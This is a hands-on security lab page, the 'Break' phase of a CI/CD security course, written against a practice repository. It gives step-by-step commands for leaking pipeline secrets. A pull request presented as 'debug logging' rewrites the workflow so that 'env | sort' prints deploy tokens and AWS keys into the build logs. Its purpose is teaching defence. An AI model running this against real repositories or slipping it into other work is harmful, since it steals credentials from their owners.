# Lab 2.1: CI/CD Fundamentals

<div class="phase-stepper">
  <a href="../" class="phase-step done">Overview</a>
  <span class="phase-arrow">›</span>
  <a href="../understand/" class="phase-step done">Understand</a>
  <span class="phase-arrow">›</span>
  <span class="phase-step current">Break</span>
  <span class="phase-arrow">›</span>
  <a href="../defend/" class="phase-step upcoming">Defend</a>
  <span class="phase-arrow">›</span>
  <a href="../detect/" class="phase-step upcoming">Detect</a>
</div>

## Exfiltrating Secrets via CI

### Step 1: Create an attack branch

```bash
cd /repos/wl-webapp
git checkout -b feature/add-logging
```

### Step 2: Modify the CI config to leak secrets

```bash
cat > .gitea/workflows/ci.yml << 'EOF'
name: WeakLink Webapp CI

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

env:
  SECRET_TOKEN: ${{ secrets.SECRET_TOKEN }}
  DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
  AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Run tests
        run: |
          echo "Running tests..."
          # "Debug logging" that leaks every secret
          env | sort
          python test_app.py
EOF
```

### Step 3: Commit and push

```bash
git add -A
git commit -m "Add debug logging to CI"
git push origin feature/add-logging
```

### Step 4: Create a pull request

```bash
curl -sf -X POST "http://gitea:3000/api/v1/repos/weaklink/wl-webapp/pulls" \
  -H "Content-Type: application/json" \
  -u "weaklink:weaklink" \
  -d '{"title":"Add logging","base":"main","head":"feature/add-logging"}'
```

When CI runs this PR, `env | sort` prints ALL environment variables including secrets. Anyone who can view the build logs sees them.

**Checkpoint:** You should now have a PR branch with a modified CI config that dumps environment variables, and a created pull request.

### Step 5: Understand the blast radius

- Any developer with write access can create a PR
- The PR modifies the CI config to print secrets
- The pipeline runs the modified config before review
- The attacker now has deploy tokens, cloud credentials, API keys

**Pipelines execute developer-controlled code with production-level credentials.**
